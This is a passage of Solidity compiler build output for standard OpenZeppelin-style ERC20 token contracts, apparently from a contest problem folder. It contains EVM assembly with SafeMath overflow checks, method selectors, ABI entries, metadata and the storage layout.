											"name": "SWAP1"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "DUP2"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "MSTORE"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "ADD"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "KECCAK256"
										},
										{
											"begin": 5288,
											"end": 5343,
											"name": "DUP2"
										},
										{
											"begin": 5288,
											"end": 5343,
											"name": "SWAP1"
										},
										{
											"begin": 5288,
											"end": 5343,
											"name": "SSTORE"
										},
										{
											"begin": 5288,
											"end": 5343,
											"name": "POP"
										},
										{
											"begin": 5376,
											"end": 5385,
											"name": "DUP2"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "AND"
										},
										{
											"begin": 5368,
											"end": 5374,
											"name": "DUP4"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "AND"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "PUSH",
											"value": "DDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF"
										},
										{
											"begin": 5387,
											"end": 5393,
											"name": "DUP4"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "MLOAD"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "DUP1"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "DUP3"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "DUP2"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "MSTORE"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "ADD"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "SWAP2"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "POP"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "POP"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "MLOAD"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "DUP1"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "SWAP2"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "SUB"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "SWAP1"
										},
										{
											"begin": 5359,
											"end": 5394,
											"name": "LOG3"
										},
										{
											"begin": 5138,
											"end": 5402,
											"name": "POP"
										},
										{
											"begin": 5138,
											"end": 5402,
											"name": "POP"
										},
										{
											"begin": 5138,
											"end": 5402,
											"name": "POP"
										},
										{
											"begin": 5138,
											"end": 5402,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "JUMPDEST"
										},
										{
											"begin": 1373,
											"end": 1380,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1406,
											"end": 1407,
											"name": "DUP3"
										},
										{
											"begin": 1401,
											"end": 1402,
											"name": "DUP3"
										},
										{
											"begin": 1401,
											"end": 1407,
											"name": "GT"
										},
										{
											"begin": 1401,
											"end": 1407,
											"name": "ISZERO"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "JUMPI"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MLOAD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP3"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP3"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "1E"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "536166654D6174683A207375627472616374696F6E206F766572666C6F770000"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SWAP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MLOAD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SWAP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "REVERT"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "JUMPDEST"
										},
										{
											"begin": 1453,
											"end": 1462,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1469,
											"end": 1470,
											"name": "DUP3"
										},
										{
											"begin": 1465,
											"end": 1466,
											"name": "DUP5"
										},
										{
											"begin": 1465,
											"end": 1470,
											"name": "SUB"
										},
										{
											"begin": 1453,
											"end": 1470,
											"name": "SWAP1"
										},
										{
											"begin": 1453,
											"end": 1470,
											"name": "POP"
										},
										{
											"begin": 1490,
											"end": 1491,
											"name": "DUP1"
										},
										{
											"begin": 1483,
											"end": 1491,
											"name": "SWAP2"
										},
										{
											"begin": 1483,
											"end": 1491,
											"name": "POP"
										},
										{
											"begin": 1483,
											"end": 1491,
											"name": "POP"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "SWAP3"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "SWAP2"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "POP"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "POP"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "JUMPDEST"
										},
										{
											"begin": 917,
											"end": 924,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 937,
											"end": 946,
											"name": "DUP1"
										},
										{
											"begin": 953,
											"end": 954,
											"name": "DUP3"
										},
										{
											"begin": 949,
											"end": 950,
											"name": "DUP5"
										},
										{
											"begin": 949,
											"end": 954,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 954,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 954,
											"name": "POP"
										},
										{
											"begin": 978,
											"end": 979,
											"name": "DUP4"
										},
										{
											"begin": 973,
											"end": 974,
											"name": "DUP2"
										},
										{
											"begin": 973,
											"end": 979,
											"name": "LT"
										},
										{
											"begin": 973,
											"end": 979,
											"name": "ISZERO"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "JUMPI"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MLOAD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP3"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SUB"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP3"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "1B"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "536166654D6174683A206164646974696F6E206F766572666C6F770000000000"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "POP"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SWAP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "POP"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "POP"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MLOAD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SWAP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SUB"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SWAP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "REVERT"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "tag",
											"value": "65"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "JUMPDEST"
										},
										{
											"begin": 1031,
											"end": 1032,
											"name": "DUP1"
										},
										{
											"begin": 1024,
											"end": 1032,
											"name": "SWAP2"
										},
										{
											"begin": 1024,
											"end": 1032,
											"name": "POP"
										},
										{
											"begin": 1024,
											"end": 1032,
											"name": "POP"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "SWAP3"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "SWAP2"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "POP"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "POP"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "JUMP",
											"value": "[out]"
										}
									],
									".data": {
										"24883CC5FE64ACE9D0DF1893501ECB93C77180F0FF69CCA79AFFB3C316DC8029": "45524332303a20617070726f766520746f20746865207a65726f2061646472657373",
										"C953F4879035ED60E766B34720F656AAB5C697B141D924C283124ECEDB91C208": "45524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373"
									}
								}
							}
						},
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decreaseAllowance(address,uint256)": "a457c2d7",
							"increaseAllowance(address,uint256)": "39509351",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Implementation of the {IERC20} interface.  * This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. For a generic mechanism see {ERC20Mintable}.  * TIP: For a detailed writeup see our guide https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms].  * We have followed general OpenZeppelin guidelines: functions revert instead of returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications.  * Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification.  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.\",\"methods\":{\"allowance(address,address)\":{\"details\":\"See {IERC20-allowance}.\"},\"approve(address,uint256)\":{\"details\":\"See {IERC20-approve}.      * Requirements:      * - `spender` cannot be the zero address.\"},\"balanceOf(address)\":{\"details\":\"See {IERC20-balanceOf}.\"},\"decreaseAllowance(address,uint256)\":{\"details\":\"Atomically decreases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`.\"},\"increaseAllowance(address,uint256)\":{\"details\":\"Atomically increases the allowance granted to `spender` by the caller.      * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.      * Emits an {Approval} event indicating the updated allowance.      * Requirements:      * - `spender` cannot be the zero address.\"},\"totalSupply()\":{\"details\":\"See {IERC20-totalSupply}.\"},\"transfer(address,uint256)\":{\"details\":\"See {IERC20-transfer}.      * Requirements:      * - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"See {IERC20-transferFrom}.      * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20};      * Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `value`. - the caller must have allowance for `sender`'s tokens of at least `amount`.\"}}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20.sol\":\"ERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20.sol\":{\"keccak256\":\"0x91a3b598fc86ea761b5a8296e26690e460e78d1606eb518994e5c2ba15fa194f\",\"urls\":[\"bzz-raw://f2e312a214c618db25822c5af3c0ea4811c7f42422b0d1051d468adbfbb53774\",\"dweb:/ipfs/QmdG5we7FRV1TFopjEvhSb63e5K2HUE3Y5fcdcR3CcuDe4\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/SafeMath.sol\":{\"keccak256\":\"0x11a066623aa9848c105e3610dd03f30d87881271d8da83a3974f898d5314025c\",\"urls\":[\"bzz-raw://76812a0f7047a8d98e291415723003b6238024ef37572453dcd96c70c946f9a7\",\"dweb:/ipfs/Qmf8SQN4J9ghTq3mVjxenmVAZtR8RnqvdfDvR5jma1gpJk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 600,
								"contract": "赛题-预赛/第四题/contracts/ERC20.sol:ERC20",
								"label": "_balances",
								"offset": 0,
								"slot": "0",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 606,
								"contract": "赛题-预赛/第四题/contracts/ERC20.sol:ERC20",
								"label": "_allowances",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 608,
								"contract": "赛题-预赛/第四题/contracts/ERC20.sol:ERC20",
								"label": "_totalSupply",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"赛题-预赛/第四题/contracts/ERC20Detailed.sol": {
				"ERC20Detailed": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "string",
									"name": "name",
									"type": "string"
								},
								{
									"internalType": "string",
									"name": "symbol",
									"type": "string"
								},
								{
									"internalType": "uint8",
									"name": "decimals",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Optional functions from the ERC20 standard.",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.      * This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets `amount` as the allowance of `spender` over the caller's tokens.      * Returns a boolean value indicating whether the operation succeeded.      * IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729      * Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the amount of tokens owned by `account`."
							},
							"constructor": {
								"details": "Sets the values for `name`, `symbol`, and `decimals`. All three of these values are immutable: they can only be set once during construction."
							},
							"decimals()": {
								"details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`).      * Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei.      * NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
							},
							"name()": {
								"details": "Returns the name of the token."
							},
							"symbol()": {
								"details": "Returns the symbol of the token, usually a shorter version of the name."
							},
							"totalSupply()": {
								"details": "Returns the amount of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves `amount` tokens from the caller's account to `recipient`.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism. `amount` is then deducted from the caller's allowance.      * Returns a boolean value indicating whether the operation succeeded.      * Emits a {Transfer} event."
							}
						}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
